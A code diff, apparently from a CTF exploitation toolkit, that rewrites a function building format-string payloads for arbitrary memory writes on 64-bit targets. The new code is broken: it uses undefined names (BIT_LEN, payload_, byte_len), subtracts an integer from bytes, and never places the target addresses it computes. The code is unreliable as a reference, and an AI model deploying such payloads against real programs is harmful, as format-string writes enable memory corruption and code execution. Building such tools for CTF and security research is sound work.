@@ -52,7 +52,7 @@ def fsa_write_32(value: int, nth_stack: int, target_addr: int | None = None, off
     return payload
 
 
-def fsa_write_64(value: int, nth_stack: int, target_addr: int | None = None, offset: int = 0, each: int = 4) -> bytes:
+def fsa_write_64(write_dict: dict[int, int], nth_stack: int, written_bytes_num: int = 0, offset: int = 0, each: int = 4) -> bytes:
     """Arbitrary write using format string bug (64bit)
 
     Args:
@@ -76,22 +76,27 @@ def fsa_write_64(value: int, nth_stack: int, target_addr: int | None = None, off
         4: "n",
     }
 
-    bit_len = 64
-    byte_len = bit_len // 8
+    BIT_WIDTH = 64
+    BYTE_WIDTH = BIT_LEN // 8
 
-    value = value % (1 << 8 * each)
-    assert value < 10**10 and nth_stack < 10**3
-    tentative_payload = b"A" * (-offset % byte_len)
-    tentative_payload += f"%{value:010}c%{nth_stack:03}${format_string[each]}".encode()
-    tentative_payload += b"A" * (-len(tentative_payload) % byte_len)
+    payload = b""
 
-    nth_stack += (len(tentative_payload) + byte_len - 1) // byte_len
+    if offset:
+        payload += b"A" * offset
+        payload = payload.ljust(BYTE_WIDTH, b"A")  # Align stack
+        nth_stack += 1
 
-    payload = b"A" * (-offset % byte_len)
-    payload += f"%{value:010}c%{nth_stack:03}${format_string[each]}".encode()
-    payload += b"A" * (-len(payload) % byte_len)
-    if target_addr:
-        payload += p64(target_addr)
+    for addr, value in write_dict.items():
+        value = p64(value)
+        for i in range(0, BYTE_WIDTH, each):
+            where = p64(addr + i)
+            what = (value[i : i + each] - written_bytes_num) % (1 << 8 * each)
+            payload_ += f"%{what:010}c%{nth_stack:03}${format_string[each]}".encode()
+
+            nth_stack += 1
+        value = value % (1 << 8 * each)
+
+    payload_ += b"A" * (-len(payload_) % byte_len)  # Align stack
 
     if b"\0" in payload.strip(b"\0"):
         logger.warning("The payload includes some null bytes.")
